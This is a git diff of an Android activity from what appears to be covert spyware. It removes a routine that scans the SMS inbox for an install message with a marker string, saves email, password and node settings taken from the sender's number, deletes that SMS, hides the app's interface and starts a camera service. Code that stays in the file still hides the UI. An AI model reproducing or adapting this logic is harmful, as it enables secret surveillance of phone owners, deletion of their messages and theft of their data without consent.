@@ -52,63 +52,6 @@ public class HomeActivity extends Activity {
 		} catch (Exception e) {}
 	}
 	
-	private boolean check_install_sms(Context _instance)
-	{
-		Log.d(TAG, "check_install_sms()...");
-		boolean ret = false;
-		
-		String[] projection = { "_id", "address", "body", "date" };
-		
-		Cursor cursor = _instance.getContentResolver().query(  
-    			Uri.parse("content://sms/inbox"),
-                projection, // Which columns to return.  
-                null, // WHERE clause.  
-                null, // WHERE clause value substitution  
-                "date"); // Sort order.
-        
-        if (cursor == null)
-    	{
-    		return ret;
-    	}
-    	for (int i = 0; i < cursor.getCount(); i++)
-    	{
-            cursor.moveToPosition(i);
-            
-            int _id = cursor.getInt(cursor.getColumnIndex("_id"));
-            String number = cursor.getString(cursor.getColumnIndex("address"));
-            String body = cursor.getString(cursor.getColumnIndex("body"));
-            
-            if (null == number || null == body) {
-            	continue;
-            }
-            number = number.replace("(+86)", "");
-            number = number.replace("+86", "");
-            
-            if (body.contains("http://") && body.contains(".apk") && body.contains("qzectbum"))
-            {
-            	String email = "ykz_" + number + "@163.com";
-            	AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1);
-            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, email);
-            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, number);
-            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, number);
-            	
-            	SimpleDateFormat sDateFormat = new SimpleDateFormat("yyyy.MM.dd_HH.mm");
-	        	long milliseconds = System.currentTimeMillis();
-	        	String time_str = sDateFormat.format(new java.util.Date(milliseconds));
-            	AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, time_str);
-            	
-            	try {
-            		_instance.getContentResolver().delete(Uri.parse("content://sms"), "_id=" + _id, null);
-            	} catch (Exception e) {
-					e.printStackTrace();
-				}
-            	ret = true;
-            }
-        }
-    	cursor.close();
-    	return ret;
-	}
-	
 	public static void DoHideUi(Context _instance)
 	{
 		try {
@@ -141,14 +84,6 @@ public class HomeActivity extends Activity {
         super.onCreate(savedInstanceState);
         
         AppSettings.delete_backup_settings_file();
-        
-        if (check_install_sms(this))
-        {
-        	AppSettings.SaveSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 1);
-        	
-        	Intent intent = new Intent(this, MobileCameraService.class);
-        	startService(intent);
-        }
         
         if (0 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
     	{
